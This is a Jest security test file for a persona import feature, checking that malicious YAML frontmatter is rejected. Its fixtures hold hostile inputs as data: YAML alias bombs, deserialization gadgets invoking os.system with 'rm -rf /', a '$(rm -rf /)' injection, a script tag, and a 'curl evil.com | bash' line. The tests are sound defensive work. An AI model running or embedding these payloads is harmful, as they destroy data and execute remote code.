/**
 * Security tests for PersonaManager YAML injection prevention
 * Phase 4.7 - YAML validation and content injection security testing
 *
 * Tests:
 * - YAML bomb detection
 * - Deserialization attack prevention
 * - Malicious pattern detection in imports
 */

import { PortfolioManager } from '../../src/portfolio/PortfolioManager.js';
import { SecurityMonitor } from '../../src/security/securityMonitor.js';
import { PersonaImporter } from '../../src/persona/export-import/PersonaImporter.js';
import { createRealPersonaManager } from '../helpers/di-mocks.js';
import type { PersonaManager } from '../../src/persona/PersonaManager.js';
import { tmpdir } from 'os';
import { mkdtempSync, rmSync } from 'fs';
import { join } from 'path';
import { FileLockManager } from '../../src/security/fileLockManager.js';
import { FileOperationsService } from '../../src/services/FileOperationsService.js';

describe('PersonaManager - Content Injection Prevention', () => {
  let personaManager: PersonaManager;
  let portfolioManager: PortfolioManager;
  let personaImporter: PersonaImporter;
  let testDir: string;

  beforeEach(async () => {
    testDir = mkdtempSync(join(tmpdir(), 'persona-injection-test-'));
    const fileLockManager = new FileLockManager();
    const fileOperations = new FileOperationsService(fileLockManager);
    portfolioManager = new PortfolioManager(fileOperations, { baseDir: testDir });
    await portfolioManager.initialize();

    personaImporter = new PersonaImporter(portfolioManager);

    personaManager = createRealPersonaManager(testDir, {
      portfolioManager,
      personaImporter
    });

    await personaManager.initialize();
    SecurityMonitor.clearAllEventsForTesting();
  });

  afterEach(async () => {
    personaManager.dispose();
    rmSync(testDir, { recursive: true, force: true });
    SecurityMonitor.clearAllEventsForTesting();
  });

  describe('YAML Bomb Detection', () => {
    it('should reject YAML bomb with anchor/alias amplification', async () => {
      const yamlBomb = `---
name: Test
bomb: &anchor
  - *anchor
  - *anchor
  - *anchor
---
Test instructions`;

      const result = await personaManager.importPersona(yamlBomb, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);

      // Verify security event was logged
      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);
    });

    it('should reject YAML bomb with excessive references', async () => {
      const yamlBomb = `---
name: Test
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
---
Test instructions`;

      const result = await personaManager.importPersona(yamlBomb, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);

      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);
    });

    it('should reject circular reference patterns', async () => {
      const circularYaml = `---
name: Test
a: &a
  b: *b
b: &b
  a: *a
---
Test instructions`;

      const result = await personaManager.importPersona(circularYaml, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious|circular/i);
    });
  });

  describe('Deserialization Attack Prevention', () => {
    it('should reject Python object deserialization', async () => {
      const pythonDeserialization = `---
name: Test
payload: !!python/object/apply:os.system ["rm -rf /"]
---
Test instructions`;

      const result = await personaManager.importPersona(pythonDeserialization, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);

      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);
    });

    it('should reject Ruby object deserialization', async () => {
      const rubyDeserialization = `---
name: Test
payload: !ruby/object:Gem::Installer { i: x }
---
Test instructions`;

      const result = await personaManager.importPersona(rubyDeserialization, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);
    });

    it('should reject Java object deserialization', async () => {
      const javaDeserialization = `---
name: Test
payload: !!java/object { class: "java.lang.Runtime" }
---
Test instructions`;

      const result = await personaManager.importPersona(javaDeserialization, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('should reject YAML with script tags', async () => {
      const scriptTag = `---
name: Test <script>alert(1)</script>
description: Normal description
---
Test instructions`;

      const result = await personaManager.importPersona(scriptTag, false);
      expect(result.success).toBe(false);
    });

    it('should reject YAML with command injection', async () => {
      const commandInjection = `---
name: Test
command: $(rm -rf /)
---
Test instructions`;

      const result = await personaManager.importPersona(commandInjection, false);
      expect(result.success).toBe(false);
    });

    it('should reject YAML with backtick execution', async () => {
      const backtickExec = `---
name: Test
exec: \`curl evil.com | bash\`
---
Test instructions`;

      const result = await personaManager.importPersona(backtickExec, false);
      expect(result.success).toBe(false);
    });
  });

  describe('Valid YAML Acceptance', () => {
    it('should accept clean YAML with valid persona data', async () => {
      const cleanYaml = `---
name: Clean Test Persona
description: A helpful coding assistant
author: testuser
version: "1.0"
category: coding
triggers:
  - code
  - debug
  - test
---
You are a helpful coding assistant that provides technical guidance.`;

      const result = await personaManager.importPersona(cleanYaml, false);

      expect(result.success).toBe(true);
      expect(result.persona?.metadata.name).toBe('Clean Test Persona');
    });

    it('should reject YAML with anchors and aliases (conservative security policy)', async () => {
      // SECURITY POLICY: To prevent YAML bomb attacks, we reject ALL anchors/aliases
      // This is a conservative approach - even "safe" 1:1 anchors are not allowed
      // This prevents edge cases and ensures no amplification attacks are possible
      const yamlWithAnchors = `---
name: Test Persona
description: Testing anchor policy
author: &username testuser
collaborators:
  - *username
version: "1.0"
---
Test instructions`;

      const result = await personaManager.importPersona(yamlWithAnchors, false);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/YAML|Malicious/i);

      // Verify security event was logged
      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);
    });
  });

  describe('Import Element Validation', () => {
    it('should validate YAML before parsing in importElement', async () => {
      const maliciousMarkdown = `---
name: Test
bomb: &a [*a, *a, *a]
---
Content`;

      await expect(
        personaManager.importElement(maliciousMarkdown, 'markdown')
      ).rejects.toThrow(/YAML|Malicious/i);

      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);
      expect(events[0].source).toBe('yaml_bomb_detection');
    });

    it('should accept clean markdown in importElement', async () => {
      const cleanMarkdown = `---
name: Clean Persona
description: A test persona
version: "1.0"
---
Test instructions`;

      const result = await personaManager.importElement(cleanMarkdown, 'markdown');

      expect(result.metadata.name).toBe('Clean Persona');
    });
  });

  describe('SecurityMonitor Integration', () => {
    it('should log YAML injection attempts', async () => {
      SecurityMonitor.clearAllEventsForTesting();

      const yamlBomb = `---
name: Test
bomb: &a [*a]
---
Test`;

      const result = await personaManager.importPersona(yamlBomb, false);
      expect(result.success).toBe(false);

      const events = SecurityMonitor.getEventsByType('YAML_INJECTION_ATTEMPT');
      expect(events.length).toBeGreaterThan(0);

      const event = events[0];
      expect(event.severity).toBe('CRITICAL');
      expect(event.source).toBe('yaml_bomb_detection');
      expect(event.details).toMatch(/malicious|YAML/i);
    });

    it('should log specific attack types in metadata', async () => {
      SecurityMonitor.clearAllEventsForTesting();

      const pythonAttack = `---
name: Test
payload: !!python/object/apply:os.system ["evil"]
---
Test`;

      const result = await personaManager.importPersona(pythonAttack, false);
      expect(result.success).toBe(false);

      const events = SecurityMonitor.getRecentEvents(10);
      const yamlEvents = events.filter(e => e.type === 'YAML_INJECTION_ATTEMPT');

      expect(yamlEvents.length).toBeGreaterThan(0);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty YAML sections', async () => {
      const emptyYaml = `---
---
Test instructions`;

      // Should handle gracefully (might succeed with defaults or fail with validation)
      try {
        const result = await personaManager.importPersona(emptyYaml, false);
        // If it succeeds, verify defaults are applied
        expect(result.persona?.metadata.name).toBeDefined();
      } catch (error) {
        // If it fails, that's also acceptable
        expect(error).toBeDefined();
      }
    });

    it('should handle YAML without frontmatter delimiters', async () => {
      const noDelimiters = 'Just plain text without YAML frontmatter';

      try {
        await personaManager.importPersona(noDelimiters, false);
      } catch (error) {
        // Should fail or handle gracefully
        expect(error).toBeDefined();
      }
    });

    it('should handle very large but valid YAML', async () => {
      const largeTriggers = Array.from({ length: 50 }, (_, i) => `trigger${i}`);
      const largeYaml = `---
name: Large Persona
description: A persona with many triggers
triggers:
${largeTriggers.map(t => `  - ${t}`).join('\n')}
---
Test instructions`;

      const result = await personaManager.importPersona(largeYaml, false);

      expect(result.success).toBe(true);
      // Should be limited to max triggers (unified limit: 20 across all element types)
      expect(result.persona?.metadata.triggers?.length).toBeLessThanOrEqual(20);
    });
  });
});
